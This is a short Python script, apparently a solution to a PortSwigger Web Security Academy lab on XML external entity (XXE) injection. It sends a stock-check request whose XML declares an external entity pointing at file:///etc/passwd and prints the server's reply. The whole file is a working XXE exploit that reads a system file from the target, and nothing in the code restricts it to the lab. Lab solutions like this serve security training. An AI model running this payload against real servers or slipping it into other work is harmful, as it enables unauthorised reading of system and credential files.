"""
https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

stock_url = f'https://{site}/product/stock'
xml_post_data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
xml_dummy_data = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

resp = s.post(stock_url,data=xml_dummy_data)
print(resp.text)